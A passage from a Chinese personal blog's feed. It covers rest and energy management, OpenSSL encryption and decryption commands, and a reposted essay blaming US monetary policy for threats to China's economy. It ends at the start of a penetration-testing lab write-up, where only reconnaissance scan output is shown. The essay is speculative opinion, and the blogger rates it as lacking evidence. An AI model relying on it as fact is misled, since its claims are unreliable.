      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何休息——精力管理</title>
    <link href="/2019/07/05/04-x/"/>
    <url>/2019/07/05/04-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：《精力管理：管理精力，而非时间–互联网+时代顺势腾飞的关键》</p><hr><p>有人可能会问，休息还用学吗？累了就睡觉呗。</p><p>但是事实上并不是如此。最近同事在调侃hw行动，要是再延长一个月，深信服会再猝死几个。虽然只是个玩笑，但是那些不懂如何休息的人，显然令人惋惜。国家义务教育十多年，好不容易可以开始为国家作贡献，但是才刚开始工作，就因为资本家的压榨而失去了年轻的生命。那些不懂如何休息的人因为疲劳而猝死，实在令人惋惜！</p><p>精力=时间+专注，精力是有限的。</p><p>在一段时间中，我们可以漫无目的的刷微博，也可以积极专注两耳不闻窗外事的阅读、写作、思考。</p><p>我们追求是是在尽可能短的时间里，完成尽可能多的工作。这就要求我们管理好自己的精力。</p><h3 id="精力管理的四个基本原则"><a href="#精力管理的四个基本原则" class="headerlink" title="精力管理的四个基本原则"></a>精力管理的四个基本原则</h3><p>全情投入</p><p>把自己的生活看作一系列短跑冲刺，在某些时间段全情投入，在另外一些时间段闲云野鹤，更新精力储备，以应对下一个挑战。</p><ol><li><p>全情投入需要调动四种独立且相关联的精力源：体能，情感，思维和意志</p></li><li><p>因为使用过度和使用不足都会削弱精力，必须不时更新精力以平衡消耗</p></li><li><p>为了提高能力，我们必须突破自己的惯常极限，模仿运动员进行系统训练。压力是我们的朋友，一定的压力可以使我们成长。《反脆弱》中说到，尼采名言：「杀不死我的，使我更强大」。</p></li><li><p>积极的精力仪式<strong>习惯</strong>，即细致具体的精力管理方法，是全情投入、保持高效表现的诀窍。 弗朗西斯·培根说过“<strong>思想决定行为，行为决定习惯，习惯决定性格，性格决定命运</strong>”</p></li></ol><h3 id="如何养成良好的习惯"><a href="#如何养成良好的习惯" class="headerlink" title="如何养成良好的习惯"></a>如何养成良好的习惯</h3><p>比如说，我以前有晚睡晚起的习惯。上大学的时候，由于白天没有什么事，晚上又不想睡，导致恶性循环。睡得时间长，但睡眠效果又不好。</p><p>在我国古代，经常会强调“主观” 而忽略“客观”。比如“人定胜天”，某时代大跃进等等。而精力也是一样，精力是和身体健康息息相关的，而不是只靠主观意志力就可以恢复的，即使依靠意志力坚持工作，持续下去也会对身体造成不可恢复的伤害。</p><h3 id="科学的周期休息"><a href="#科学的周期休息" class="headerlink" title="科学的周期休息"></a>科学的周期休息</h3><p>睡眠有90～120分钟的周期，从浅层睡眠——大脑活动频繁和做梦的阶段，到深度睡眠——大脑静止并深层修复。大脑清醒状态下也存在同样的90～120分钟的周期。经过1个小时左右，所有数值都开始下降。大约90～120分钟之后，身体开始渴望休息和恢复，并发出一些信号，如打哈欠和伸懒腰，阵发饥饿感，压力增大，难以集中，做事拖拉，胡思乱想，容易犯错等。</p><p>所以，<strong>学习/工作1~2小时后，必须让自己停止，从高速运转的轨道上脱离，将全部注意力转移到恢复精力上去。</strong></p><ol><li><p>冥想5分钟。<br>冥想的目的是，好好的深呼吸，让氧气运送到疲劳的地方去。这时候要全身放松，最好可以来一点轻音乐。可以设置一个歌单，最后一首歌要是摇滚类型的燃音乐，每次你一听到这首歌，你就知道休息的时间结束了。</p></li><li><p>午休20分钟。<br>午休的时候不要玩手机。。。</p></li><li><p>晚上10点睡，早上7点前起床。一天睡8小时，不要占用睡眠的时间去做其他事，否则效率会降低，会导致你需要更长的工作时间去完成任务。得不偿失。</p></li><li><p>恢复精力的小技巧<br>可以在学习/工作1个多小时后，先去上厕所，然后洗把脸，按摩太阳穴。然后回到座位上，喝100多毫升的水。每天多喝水对身体有好处，同时又达到了休息的目的。喝完水，进行冥想5分钟。这样可以恢复疲劳，提高效率。</p></li></ol><h3 id="戒除成瘾行为"><a href="#戒除成瘾行为" class="headerlink" title="戒除成瘾行为"></a>戒除成瘾行为</h3><p>任何成瘾行为，包括工作，都会导致精力储备急剧消耗。</p><p>成瘾是指对某些人或事呈病态的依赖。偶尔的放松不叫成瘾，而三天三夜不眠不休打网游最后猝死的少年，才叫成瘾。</p><p>如果你有任何成瘾行为，包括但不限于酗酒、吸毒、赌博.etc</p><p>必须解除这种妨碍正常休息的习惯。不解除成瘾习惯，就不可能好好休息。</p><h3 id="超量补偿——提升现有的能力"><a href="#超量补偿——提升现有的能力" class="headerlink" title="超量补偿——提升现有的能力"></a>超量补偿——提升现有的能力</h3><p>提升肌肉极限，就要说到“超量补偿”的概念。若现有的肌肉力量不足以达到要求，身体就会通过制造更多肌肉纤维来应对下一次刺激。</p><p>为了提升我们的能力，我们需要在短期冲刺，短时间内极度专注的做某件事，然后再好好休息。这种方法会提升我们的能力。</p><p>如果我们提升了自己的能力，就能游刃有余的应对生活，就可以有更多的时间来休息。例如，以前完成工作需要8小时，现在只需要4小时，那么其余的时间我们就不需要工作，也可以拿出一部分时间提升自己的能力，其余时间用来放松、休闲娱乐。</p><p>拓展能力是为了长期的回报。</p><h2 id="如何锻炼"><a href="#如何锻炼" class="headerlink" title="如何锻炼"></a>如何锻炼</h2><p>注重饮食和运动</p><h3 id="早餐"><a href="#早餐" class="headerlink" title="早餐"></a>早餐</h3><p>一顿低升糖指数的早餐可以提供高效并持久的精力，例如全麦食物、蛋白质和低糖水果——草莓、梨子和苹果等。相反，高升糖指数的食物如松饼和甜麦片短期内可以激发精力，但30分钟后精力水平就会显著下降。</p><p>购买全麦面包、水果、牛奶，然后养成每天早上吃这些健康食物的习惯。我以前在北京上班的时候，有同事每天早上一杯咖啡、一桶泡面，结果当然是超重。。。</p><p>重点是<strong>低升糖指数早餐</strong></p><p>建议：酸奶全麦麦片或加奶果汁——蛋白粉，脱脂牛奶，香蕉，草莓和蓝莓轮流作为早餐。</p><h2 id="进食频率"><a href="#进食频率" class="headerlink" title="进食频率"></a>进食频率</h2><p>大多数人总是陷入两个极端，花了太长时间消化食物，又一次吃太多补回来。因为精力需求到夜晚会减少，新陈代谢也会减缓，因而早上多摄入热量、晚上少摄入热量是有科学道理的。</p><p>健康零食，坚果、水果.etc有助于正餐少吃，也可以恢复精力。避免过于饥饿导致吃的太多。</p><p>每3小时可以适量摄入一点食物。</p><p><strong>上午多吃，晚上少吃</strong></p><h2 id="多喝水"><a href="#多喝水" class="headerlink" title="多喝水"></a>多喝水</h2><p>一家研究机构称，每天至少饮用1.8公斤水对维持体能有诸多好处。肌肉若缺水3%就会失去10%的力量和8%的速度。喝水不足也会损害大脑的注意力和协调能力。</p><h2 id="间断性训练与力量训练"><a href="#间断性训练与力量训练" class="headerlink" title="间断性训练与力量训练"></a>间断性训练与力量训练</h2><p>最近哈佛大学和哥伦比亚大学发起一项联合研究，研究员发现一系列短时间、高强度的有氧练习——维持60秒左右——加上完整的有氧恢复过程，对于受试者有出人意料的积极影响。只需8周时间，受试者的心脑血管健康水平显著提升，心率变化减少，情绪得以改善，免疫力提高，舒张压也降低不少。</p><p>间断性训练长久以来都是我们训练系统的核心组成部分。参与方式有很多，包括短跑、爬楼梯、骑自行车甚至举重，只要能够节奏性地提高和降低心率即可。</p><p>力量训练与心血管训练同等重要，体力丧失是机体衰老和能力下降的显著特征。</p><ul><li>  体能精力是生活最基本的精力源。</li><li>  体能精力通过氧气和葡萄糖的化学作用获得。</li><li>体能精力最关键的两项调节器是呼吸和进食。</li><li>  每天吃5～6顿低热量高营养的食物，能够为机体持续供应葡萄糖和必须的营养。</li><li>  每天喝64盎司的水是有效管理体力的关键要素。</li><li>  大多数人需要每晚7～8小时的睡眠，方可正常运作。</li><li>  早睡早起可以优化效能表现。</li><li>  间歇训练比稳态训练在锻炼体力方面更有效，在体力恢复方面更高效。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在运用这些提到的方法，十分有效，使我减少了睡眠时间（以前睡太多了），早睡早起并且提高了工作效率。</p><p>希望能在2个月时间里养成良好的习惯。</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>openssl加解密</title>
    <link href="/2019/06/27/05-x/"/>
    <url>/2019/06/27/05-x/</url>
    
    <content type="html"><![CDATA[<p>当我们拿到一个des对称加密的密文后，可以用openssl这个软件包进行解密。里面集成了很多密码学的加密方式。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">6XaMMbM7</span><br><br><span class="hljs-attribute">U2FsdGVkX18IBEATgMBe8NqjIqp65CxRjjMxXIIUxIjBnAODJQRkSLQ</span>/+lHBsjpv<span class="hljs-number">1</span>BwwEawMo<span class="hljs-number">1</span>c=<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/06-27-05/1.PNG" alt="1"></p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>在解密时，没有添加-a参数，导致显示<code>bad magic number</code>。</p><p>原因是由于文件加密后是二进制形式，不方便查看，使用该参数可以使加密后的内容经过base64编码，使其可读；同样，解密时需要先进行base64解编码，然后进行解密操作。</p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">openssl <span class="hljs-keyword">enc</span> -aes-256-cbc -salt -<span class="hljs-keyword">in</span> <span class="hljs-keyword">file</span>.txt -<span class="hljs-keyword">out</span> <span class="hljs-keyword">file</span>.txt.<span class="hljs-keyword">enc</span><br><br><span class="hljs-keyword">enc</span>代表<span class="hljs-keyword">encode</span>，加密<br>-aes-256-cbc 代表加密方式<br>-salt 增加加密强度<br>-<span class="hljs-keyword">in</span> 设置输入文件<br>-<span class="hljs-keyword">out</span>设置输出文件<br></code></pre></div></td></tr></table></figure><p> 如果没有设置-salt选项，很容易导致字典暴力破解</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">openssl <span class="hljs-keyword">enc</span> -<span class="hljs-keyword">des</span> -<span class="hljs-keyword">d</span> -salt -a -<span class="hljs-keyword">in</span> passfile -<span class="hljs-keyword">out</span> <span class="hljs-keyword">outfile</span><br>-<span class="hljs-keyword">d</span> 解密<br>-<span class="hljs-keyword">in</span>、-<span class="hljs-keyword">out</span>同上所述<br>[-a/-base64]<br>由于文件加密后是二进制形式，不方便查看，使用该参数可以使加密后的内容经过base64编码，使其可读；同样，解密时需要先进行base64解编码，然后进行解密操作。<br>[-k/-kfile]<br>兼容以前版本，指定密码输入方式，现已被pass参数取代<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>人民币升值带来的经济问题</title>
    <link href="/2019/06/10/03-x/"/>
    <url>/2019/06/10/03-x/</url>
    
    <content type="html"><![CDATA[<p>本文转载自：<a href="https://imain.iteye.com/blog/263543">https://imain.iteye.com/blog/263543</a></p><h2 id="人民币升值带来的经济问题"><a href="#人民币升值带来的经济问题" class="headerlink" title="人民币升值带来的经济问题"></a>人民币升值带来的经济问题</h2><h3 id="前言：历史上最初的货币-黄金"><a href="#前言：历史上最初的货币-黄金" class="headerlink" title="前言：历史上最初的货币-黄金"></a>前言：历史上最初的货币-黄金</h3><p>近期来美国和日本压人民币升值的话题，成为了热点。美国和日本指责中国政府干预外汇自由，要求中国实行浮动汇率，放开资本管制。而中国则坚定或者委婉地予以拒绝。</p><p>要说清楚这个问题，得首先从黄金谈起。大家知道，人类最初的货币是黄金和白银。黄金和白银由于不易变质，产量又不是很多，易于切割，成为了所有国家都接受的财富符号。</p><p>当时欧洲殖民主义者对黄金产生狂热的迷恋，他们寻找新大陆的重要目的就是寻找黄金。后来的不少文献在谈到这段历史时，大都指责资本主义赤裸裸的掠夺财富，进行资本原始积累的罪恶本性。事实上，如果把当时的欧洲看作是相对孤立的整体的话，也就是说，假如掠夺来的黄金主要只在欧洲内部使用，那么这些黄金对于欧洲来说，谈不上什么原始资本积累，而只是相当于货币扩张而已。简单地说，欧洲黄金的增多，就跟今天的多印钞票一样，轻度的黄金扩张可以刺激经济，而过分的黄金扩张只会让经济发疯。<br>　　<br>当然，黄金总量如果不增长，就跟今天的中央银行停止发行钞票一样，经济也会因为缺乏足够的货币而停滞萧条。 </p><p>黄金就其质地来说，非常适合作为货币。但是它并不是具备货币的所有要求。这体现在它的供应上。黄金的供应是自然决定的，有时候多有时候少。而国家经济的发展往往需要稳定的货币供应。特别是世界经济发展到一定总量时，黄金就再也跟不上经济的增长，而成为经济的制约因素。<br>　　<br>在货币的进化过程中，开始出现纸钞。最开始的纸钞就是借条。银庄（相当于今天的私人银行）发出纸钞，拿着纸钞的人可以在银庄的各个分庄换取银子或者黄金。由于发出去的钞票随时都可能换成黄金或者银子，所以各个银庄必须在有等量的黄金或者银子时，才敢发钞票。这就是大家常常听说的：发放钞票要以黄金外汇等储备为基础。当然，这种说法反映的是当时的现实。有些学经济的还用这句话来解释当今的货币政策，就是胡扯了。<br>　　<br>在银庄发放钞票的过程中，发现自己可以比黄金或者银子拥有量更多的发钞票？？因为钞票不可能立刻要兑换成黄金。特别是对于那些大银庄，他们的钞票因为信誉好，甚至可以直接像黄金白银那样来买东西，人们也就不在乎是不是一定要兑换成黄金白银了。这样，银庄发出的钞票远远超过了其黄金白银拥有量。</p><p>这就是信誉货币的开端。</p><p>它意味着，货币可以凭空的印刷出来。但是无论过去还是现在，这种扩张都是通过信贷完成的。因此不少经济学者坚持：即便货币可以凭空创造，但是也只能以信贷的方式进行扩张。这种说法完全没有理论依据，我可以预言，如果说货币财政政策要进行改革，那么首先将会在货币的发行方式上对传统理论的突破。<br>　　<br>由于银庄发放钞票可以超过它实际拥有的财富，只要不发生挤兑，它就实质上是占有了这些多余的财富。这就类似于现代国家发行钞票的货币税。同时钞票由私人发行，也不利于国家对经济的宏观调控。所以在货币的演化过程中，国家开始集中发钞权。国家发行钞票，最初也是以黄金作为本位，也就是国家要拥有多少黄金才发多少钞票，钞票可以自由兑换黄金。<br>　　<br>但是后来随着经济的发展，货币总量需求增大，黄金开始紧缺，国家不得不在黄金储量之外发行过量的钞票。此时金本位崩溃。再后来黄金成为国际间的重要支付手段，国家感觉有必要自己进行掌握，所以国家就开始终止钞票和黄金的自由兑换，而把有限的黄金用于国家控制。这样就进入彻底的信用货币时代，黄金作为一国内的支付手段退出流通领域。国家发行钞票完全根据自己的需要，并获取发行钞票的巨大利润。因为他们付出的是纸，印出的却是钱。<br>　　<br>基于同样的原理，国际外汇市场也走在同样的演化路径上。<br>　　<br>二战过后，各国把黄金交放到美国央行，<strong>美国按照与黄金的一定比例投放美元</strong>。各国都接受美元为世界通用的货币，这个过程相对是比较公平的。但是很快，由于世界经济的迅速发展，不要说美国的黄金储备，就是世界的黄金总产量都跟不上经济的发展，美国要满足各国把美元作为外汇储备以及世界货币的需要，不得不<strong>开始超出黄金储量来印刷美元</strong>。</p><p>在谈到这段历史时，要纠正一个错误，就是美国大量印刷美元，来解决它的外汇逆差，并不一定是因为美国经济的衰退造成的。即便美国的经济不衰退，世界经济的发展也将促使它在黄金储备以外发行美元。特别是，美国自身的经济发展越快，就越有多印美元的需求。如果美国的经济长期处于顺差，则美元就无法发到世界上去，也就成为不了世界货币。 </p><p>由于美元发行的总量远远超过了美国的黄金储备，美元相对黄金就再也无法维持以前的比率，美元不得不进行贬值。此时世界掀起抛售美元，提取黄金的热潮，如果放任下去，美国央行的黄金可能被耗尽，于是美国政府宣布，停止美元与黄金的兑换，美元与黄金脱钩。这就是布雷顿森林体系的垮台。 </p><p>布雷顿森林体系的垮台，不是由于哪个国家的经济衰退引起的，而是世界经济发展的必然历史趋势。 虽然布雷顿森林体系垮台，美元凭借其历史惯例和强大的经济实力，作为世界货币的地位仍然不可动摇。<strong>而且这个时候美元的霸权开始显现出来，美元开始作为美国攫取其他国家财富的重要手段而存在。</strong></p><h3 id="信用货币——印钱的通胀时代"><a href="#信用货币——印钱的通胀时代" class="headerlink" title="信用货币——印钱的通胀时代"></a>信用货币——印钱的通胀时代</h3><p>形象一些说，此时美国类似世界央行。美国发行的美元已经成为信用本位的货币。它可以凭空印刷美元，用于购买它国生产的实物财富。也就是说，美国可以用白纸来换取它国的原材料、以及其它实物产品。有人会说，当美国用美元购买它国产品时，其它国家也就获得了美元，其它国家可以持美元反过来购买美国产品，因此不存在说美国霸权不霸权的问题。这个问题涉及到两个方面。一个方面与目前美元贬值的问题密切相关，这个在后面我会阐述。这里我谈它的第一方面，就是美元的货币税问题。<br>　　<br>虽然拥有美元的国家可以向美国购买产品，从而使得与美国的交换成为等价交换，但是一方面它是各个国家的重要外汇储备手段，随着经济的增长，储备也会逐渐增多；另一方面美元作为世界货币，它必定要在世界其他各国流通，而且世界经济发展越快，在各国流通的总量也就增长越快。</p><p>因此从局部看，不断有美元流出或者流进美国，但总体上，还是以<strong>美国向外输出美元，向内输入实物财富</strong>为主。这就是大家看到为什么往往都是美国逆差的真正原因。这长期停滞在美国之外的美元，就是美国向各国收取的货币税。美国凭借货币税的特权，直接无偿掠夺别国财富。因此大家再看到美国对世界上其它国家进行援助时，应当知道它可能仅仅归还了从这些国家掠夺过来的部分财富而已。同时大家再看到美国逆差，而且美国拼命指责其他国家造成它的逆差时，千万不要轻易得出美国真的吃亏的结论，它是在贼喊捉贼。<br>　　<br>的确，如果美国美元输出过多，这些输出的美元如果反过来购买美国的产品，无疑是美国财富的损失，其收的货币税就少了。所以，美国采取了另外一个措施：贬值。我个人相信，美元保持一定时期的稳定，然后贬值，然后再保持一定时期的稳定，然后再贬值，是美国的一项长期既定战略而不是什么突发危机使然。</p><p>当其他国家都储存太多的美元储备后，例如中国这样的国家不吃不喝勒紧裤腰带的积累了3000多亿美元的外汇储备，美国就开始考虑贬值了。美国贬值货币主要通过降低利率，扩张财政支出，以及央行干预来完成。通过这些措施，使得美元供应量增大，美元贬值。美国的降低利率和扩张财政支出，对本国经济也要造成影响，譬如经济可能过热。</p><p>但是美国对于国内经济，虽然我并不能断定它是有意为之还是对经济运行还不是太熟悉，总之在它执行美元贬值手段时，严格的控制了国内的需求，也就是说通过供需失衡，使得美元利率下调，美元贬值，同时美国的经济还不过热。我已经声明，不排除是美国对经济还不熟悉的原因导致其供需失衡。但是，如果换上是我，如果对经济比较了解的话，不排除不采取某些相似手段。特别是美国刚刚完成一场战争，也给贬值造成了有利条件。<br>　　<br>假使美元贬值10%，则中国外汇储备硬生生损失300-350亿美元。放之世界，各国又要损失多少？美国又要掠夺多少？ </p><p>当然，美国虽然容许一定的逆差，但是逆差太大，给它带来的影响也是不利的。美国一方面通过贬值减少逆差，另一方面，特别是小布什执政，削弱福利，经济萎缩，失业增加，因此增加出口外贸需求就成为拉动经济的重点。美国出口产品多是附加值高的高科技产品，出口再多，对于美国的实物财富减少也影响很小。所以增加出口，并以出口获取的财富用来进口低附加值的实物财富，也是美国经济的重点。而美元贬值，降低了其出口价格，增加了出口。</p><p>以美国和中国两国而言，美元贬值，人民币升值，对于今后的进出口影响自不必说，最狠的一招还在后面。<br>　　<br>美国和日本指责中国政府干预外汇市场。其要求主要有两个，一个是人民币要升值，一个是资本市场管制要放开，也就是说资本可以自由兑换。这两个要求足以对中国经济构成致命的杀伤力。<br>　　<br>一种货币的贬值可以有多种手段。例如美国，是通过调节美元利率等国内经济政策手段来实现。但是这种方法运用不当的话，往往会伤人一千，自伤八百，因为这些国内经济政策不但影响外汇市场，还威胁本国国内经济。坦率的说，这也是西方经济理论本身的缺陷导致的。而中国采取的是另外一种方式，就是直接通过央行的买进卖出，来保证外汇市场人民币的汇率。同时中国还采取资本管制，资本并不能自由进出中国市场。因此中国可以在相对屏蔽本国经济的情况下对外汇市场进行干预。但无论如何，货币是否贬值，大多都是由政府政策决定的。无论美国也好还是日本也好，其货币的贬值都是政府干预的结果，而不是什么他们口口声声说的市场、自由。日本有官员说虽然利率由政府决定，但是汇率应当由市场决定的说法简直是搞笑，这是典型的话语霸权。都是干预手段，都导致货币贬值的后果，难道惟独你那种干预是市场经济，我这种干预就是政府干预？说句实话，目前西方通行的外汇体系本身就有很多缺陷，难道弥补这些缺陷，不跟你犯同样的错误就是政府干预？<br>　　<br>他们的真正目的，除了上面说的以外，还在于一个更加阴险的措施。<br>　　<br>在他们要求人民币升值之时或者之前，美国或者日本的金融投机家开始把大量资金暗地流入中国。</p><p>如果中国资本市场开放，这种流入就更加容易。资金流入中国后，兑换成人民币，等着人民币升值。</p><p>人民币升值后，这些金融大鳄就开始抛出人民币，购买美元。中国央行不可能也跟着抛出人民币购买美元，如果那样的话人民币的汇率就会下跌。</p><p>中国央行为了维持人民币汇率，必须购买人民币，抛出美元等外汇储备。本来中国的人民币之所以表面上看要升值，是因为中国经济失衡，需求不足，物价低迷，大量人民币游移于市场之外的结果，特别是近年来大量资金外逃，据统计外逃资金达3万亿之巨，并不是人民币真的就该升值了。</p><p>如果那时资本市场开放，外逃资金加上中国本土藏于地下的人民币倾巢而出，再加上金融大鳄利用金融杠杆，以一元资金调动十元的比率，来冲击人民币，可能最终有两个结果。</p><p>比较乐观的结果是中国央行外汇储备足够，最终咬牙撑住了人民币汇率，但是此时由于已经大量的抛出美元，所以外汇储备也是损失殆尽，国家经济倒退几年乃至十多年。</p><p>第二个结果更为恐怖，就是央行发现无法支撑，最终放任人民币汇率变化。</p><p>此时人民币汇率将一路下跌，人民币越下跌，人们越是抛出人民币，越抛出人民币，人民币汇率越下跌，直到最后崩溃为止。这就是东南亚金融危机的翻版。到那个时候，中国彻底萎靡不振。<br>　　<br>这是人民币升值可能带来的最严重的后果。即便中国仍然在资本管制，但目前各种投机资本仍然通过各种途径进入中国200多亿美元就是迹象。 </p><p>那么，可不可以人民币不升值，但资本放开管制呢？如张五常主张的那样？相形而言，我宁愿人民币浮动一下汇率，同时不开放资本兑换，也不愿意固定人民币汇率下开放资本市场。因为浮动汇率，游资要来冲击人民币，至少我可以通过行政手段加强管制，而开放资本市场，在目前人民币总体上看可能反而是贬值的情况下看，如果国外金融大鳄连同地下人民币狙击中国，即便人民币不升值，也可能耗去大量外汇储备，经济遭受重大损失。<br>　　<br>从另一方面，我们又不禁要问，即便美国不耍手腕来抢夺中国手中的外汇，外汇对于中国就有什么意义吗？<br>　　<br>长期以来，中国由于教育、社保福利等政策上的失误，以及中西部经济差距、城乡经济差距的进一步增大，致使内需严重不足。内需的不足又导致工资进一步降低，反过来又致使内需进一步下降。所以中国把经济的发展寄托于外需，希求通过外贸把产品卖出去。但是中国的产品多是低级产品，在国际市场上的竞争主要是靠廉价。而这种廉价又主要依靠中国的廉价劳动力来完成的。这是一个非常严重的问题：如果长久的压低劳动力的工资，则国内内需将没有启动的可能，中国会进一步依赖外需；而依赖外需又需要再压低劳动力的工资，以在国际市场上竞争，而压低劳动力工资又将继续压抑内需。<br>　　<br>现在抽出身来回看我们的国内经济，当真是一幅奇观：<br>　　<br>**我们不断的生产大量产品源源不断的输往国外，换回大量的外币，国内人民却无法消费。换回的大量外币又被国家通过购买美国等外国的国债等方式，流回美国等国家。 **<br>　　<br>这样，中国以纸币标志的GDP不断增加，但是用于国内消费的财富却不见增长甚至可能下降。<br>　　<br>又由于内需不振，外需就占了总需求的相当比重，所以人们就以为外需更加重要，进一步不惜抑制内需来扩张外需，于是国家经济进一步走向歧形。其表现形式是外汇出现大量顺差，国内需求萎靡不振。<br>　　<br>夫一国之经济，根本应依赖于物质财富的消费，此种消费乃是下一轮物质财富再生产的源泉，岂能守着几张花花绿绿的废纸来富强邦国。美国常年保持外汇逆差，却成为了经济超级大国，非常重要的一点便在此。中国外贸所得外汇，不用于购买国外相应物质财富以供国内发展，别说4千亿美元储备，就算有4万亿美元又与废纸何异？可叹了枉自紧缩了国内需求，却是与他人作嫁衣裳。<br>　　<br>外贸之输赢，不在你逆差还是顺差，而在你产品的附加值是否高。倘若产品的附加值低，你顺差越多，国力便越是衰退。不过此经济分析，不是此文内容，放作以后分析。<br>　　<br>目前中国央行正竭力抑制人民币升值，其采取的干预方式乃是标准的西方宏观货币政策，即买进美元，抛出人民币。为防止抛出人民币导致通货膨胀，另一方面又紧缩银根，削弱正常途径的货币投放数量，以求达到一国货币总量的稳定。这种方法非常危险，因为虽然好象总量上货币稳定，但是加强了经济的不均衡，正常的商业运作被紧缩性的货币政策限制，抛出的人民币却大量的游移于市场之外。结果中国的经济将处于这样一个两难境地：经济继续紧缩，需求继续疲惫，而大量人民币成为地上悬河，随时可能崩溃。因此正常经济一旦稍有起色，央行就不得不担惊受怕，怕这悬河垮了，造成通货膨胀，所以收紧钱口袋。而收紧钱口袋，经济便没有起色。所以两派经济学家吵架，一派说中国经济要通货膨胀，一派说中国还在通货紧缩，都有道理又都没有道理。关键怕的就是这道悬河，是悬在头顶上的一柄剑。如果没有这道悬河，中国经济究竟是紧缩还是膨胀，局势就会明朗，争论就会少得多。<br>　　<br>中国经济要正常运转，必须削掉这道悬河。加强对垄断利润的税收，加强打击资金外逃，实行财产登记制度，增设遗产税。加大教育投入，加大社保医疗等公共福利设施投入。切实保障工人权利，提高我国劳动力素质，不要老是以廉价劳动力为荣。把外向型经济转为内向型经济。</p><p>以上措施，可以相当于中央银行紧缩银根给投资造成的影响一样，但是却可以刺激投资的积极性和增加消费，削去悬河，因此与仅仅紧缩银根不可同日而语。对于目前的外汇储备，除了保留必要的用来稳定市场的部分外，应当用以购买战略资源或者技术，通过这种方式把美元抛出去，以绝国际社会之话柄，并同时让外汇切切实实地用来建设中国，而非像守财奴一般抱着外汇压箱底。</p><p>要是中国以后被迫抛出美元之时，是通过吸纳人民币来抛出美元，中国央行还自以为是执行外汇调控政策，则中国数十年之积累，转眼便灰飞烟灭，一场空矣。 </p><p>一句话：解决外汇困境，攘外必先安内。</p><p>评价：论据不足</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bank（不能再简单的文件上传+suid提权）</title>
    <link href="/2019/05/31/10-x/"/>
    <url>/2019/05/31/10-x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.29</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">6.6</span>.<span class="hljs-number">1</span>p1 Ubuntu <span class="hljs-number">2</span>ubuntu2.<span class="hljs-number">8</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-<span class="hljs-symbol">hostkey:</span> <br>|   <span class="hljs-number">1024</span> 08<span class="hljs-symbol">:ee</span><span class="hljs-symbol">:d0</span><span class="hljs-symbol">:</span><span class="hljs-number">30</span><span class="hljs-symbol">:d5</span><span class="hljs-symbol">:</span><span class="hljs-number">45</span><span class="hljs-symbol">:e4</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:db</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span><span class="hljs-symbol">d:</span><span class="hljs-number">54</span><span class="hljs-symbol">:a8</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span><span class="hljs-symbol">c:</span><span class="hljs-symbol">ef:</span><span class="hljs-number">15</span> (DSA)<br>|   <span class="hljs-number">2048</span> <span class="hljs-symbol">b8:</span><span class="hljs-symbol">e0:</span><span class="hljs-number">15</span><span class="hljs-symbol">:</span><span class="hljs-number">48</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">d:</span>0<span class="hljs-symbol">d:</span><span class="hljs-symbol">f0:</span><span class="hljs-symbol">f1:</span><span class="hljs-number">73</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:b7</span><span class="hljs-symbol">:</span><span class="hljs-number">81</span><span class="hljs-symbol">:</span><span class="hljs-number">64</span><span class="hljs-symbol">:</span>08<span class="hljs-symbol">:</span><span class="hljs-number">4</span><span class="hljs-symbol">a:</span><span class="hljs-number">91</span> (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-symbol">a0:</span><span class="hljs-number">4</span><span class="hljs-symbol">c:</span><span class="hljs-number">94</span><span class="hljs-symbol">:d1</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">b:</span><span 